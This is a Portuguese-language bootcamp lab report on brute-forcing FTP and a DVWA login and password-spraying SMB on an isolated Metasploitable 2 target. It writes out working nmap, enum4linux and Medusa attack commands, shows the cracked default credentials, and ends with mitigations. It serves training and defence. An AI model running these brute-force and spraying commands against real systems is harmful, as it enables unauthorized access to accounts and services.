# 🛡️ Final Report — Kali Linux Medusa Brute Force Lab

Bootcamp: **Santander Cybersegurança 2025 (DIO)**  
Aluno: **Matheus Santos**  
Ambiente: Kali Linux (atacante) + Metasploitable 2 (alvo)  
Ferramenta principal: **Medusa**  

---

# 📘 1. Introdução

Este relatório apresenta a execução completa de um laboratório de cibersegurança ofensiva, focado em ataques de:

- Força bruta (FTP)
- Automação de login Web (DVWA)
- Password Spraying (SMB)

O objetivo é demonstrar compreensão prática de ataques de autenticação, enumeração de serviços e análise de vulnerabilidades em ambiente controlado.

---

# 🧩 2. Arquitetura do Ambiente

```

+-----------------------+              +-----------------------------+
|       Kali Linux      |              |      Metasploitable 2       |
|  (Atacante, Medusa)   |  Host-Only   |  (Servidor Vulnerável)      |
|  Nmap, Medusa, SMB    | <----------> |  FTP, DVWA, SMB, etc        |
+-----------------------+              +-----------------------------+

````

- Rede: **Host-Only**
- Alvo: `<TARGET_IP>` (no laboratório real: 192.168.0.3)
- Todas as ações foram realizadas em ambiente seguro e isolado.

---

# 🔍 3. Enumeração Inicial (Nmap)

### Comando:
```bash
nmap -sS -sV -O -p- <TARGET_IP> -oN evidence/nmap_full.txt
````

### Resultado (resumo):

* **21/tcp** — FTP (vsftpd 2.3.4)
* **80/tcp** — HTTP (DVWA / Apache 2.2.8)
* **139/tcp, 445/tcp** — SMB (Samba 3.0.20)
* Vários outros serviços inseguros (Telnet, MySQL, VNC, DistCCD etc.)

> A superfície de ataque é extremamente ampla, o que é típico do Metasploitable 2.

Evidência: `evidence/nmap_full.txt`

---

# 🔐 4. Ataque de Força Bruta (FTP)

### Comando:

```bash
medusa -h <TARGET_IP> -u ftp \
       -P wordlists/small-passwords.txt \
       -M ftp -f \
       -O evidence/ftp_medusa_output.txt
```

### Resultado:

```
User: ftp
Password: 123456
[SUCCESS]
```

O serviço FTP estava configurado com credenciais fracas, permitindo acesso não autorizado.

Evidência: `evidence/ftp_medusa_output.txt`

---

# 🌐 5. Ataque Web (DVWA) — HTTP Brute Force

O DVWA utiliza um token anti-CSRF (`user_token`), o que inviabiliza o uso direto do módulo `web-form` no Medusa.

Para contornar isso, utilizou-se o módulo **HTTP genérico**, baseado na variação da resposta do servidor.

### Comando:

```bash
medusa -h <TARGET_IP> \
       -u admin \
       -P wordlists/small-passwords.txt \
       -M http \
       -m DIR:/dvwa/ \
       -O evidence/dvwa_http_output.txt
```

### Resultado:

```
User: admin
Password: 123456
[SUCCESS]
```

Ataque efetivo com deteção automática pela resposta HTTP (código, tamanho, redirecionamento etc.).

Evidência: `evidence/dvwa_http_output.txt`

---

# 📁 6. Enumeração SMB (Samba)

### Comando:

```bash
enum4linux -a <TARGET_IP> | tee evidence/enum4linux_output.txt
```

### Descobertas importantes:

* **Sessão anônima habilitada**:

  ```
  Anonymous login successful
  ```
* Políticas extremamente fracas:

  * Senha mínima: **0**
  * Complexidade: **desativada**
  * Lockout: **não configurado**
* Diversos usuários listados (root, msfadmin, postgres, user etc.)

Evidência: `evidence/enum4linux_output.txt`

---

# 💥 7. Password Spraying SMB — Sucesso

Com base na enumeração prévia, realizou-se um ataque de Password Spraying utilizando listas de usuários e senhas comuns.

### Comando:

```bash
medusa -h <TARGET_IP> \
       -U wordlists/users.txt \
       -P wordlists/common-passwords.txt \
       -M smbnt \
       -m DOMAIN:WORKGROUP \
       -f \
       -O evidence/smb_medusa_output.txt
```

### Resultado:

```
ACCOUNT FOUND:
User: msfadmin
Password: msfadmin
Access Allowed: ADMIN$
```

A credencial `msfadmin:msfadmin` permitiu acesso ao compartilhamento administrativo `ADMIN$`, indicando risco crítico de comprometimento interno.

Evidência: `evidence/smb_medusa_output.txt`

---

# 🛡️ 8. Medidas de Mitigação

### Autenticação

* Substituir credenciais padrão (`msfadmin`, `user`, `postgres`)
* Implementar política de complexidade de senha
* Definir política de bloqueio após tentativas falhas

### Serviços

* Desabilitar sessão anônima no SMB
* Remover compartilhamentos administrativos (`ADMIN$`)
* Desabilitar serviços inseguros (Telnet, VNC, Distccd, Rlogin)

### Arquitetura

* Restringir exposição do SMB a redes internas de confiança
* Aplicar segmentação (VLAN) e firewall interno

### Atualizações

* Atualizar Samba (3.x é extremamente vulnerável)
* Manter patches de segurança aplicados

---

# 🧠 9. Aprendizados e Conclusão

Este laboratório permitiu exercitar:

* Enumeração real de serviços expostos
* Execução de força bruta com Medusa
* Entendimento de tokens anti-CSRF no DVWA
* Password spraying em serviços SMB
* Documentação técnica e mitigação de riscos
* Uso de wordlists personalizadas
* Coleta sistemática de evidências

O ambiente vulnerável demonstrou como **senhas fracas** e **políticas ineficientes** podem comprometer serviços críticos — especialmente FTP e SMB — permitindo escalonamento dentro da rede.

---

# 📎 10. Evidências

Todos os arquivos de saída dos testes encontram-se em:

```
/evidence
```

E screenshots adicionais em:

```
/images
```

---

# 🏁 Final

Este relatório encerra o laboratório de força bruta e password spraying com Medusa, representando um case de estudo prático ideal para portfólio e LinkedIn.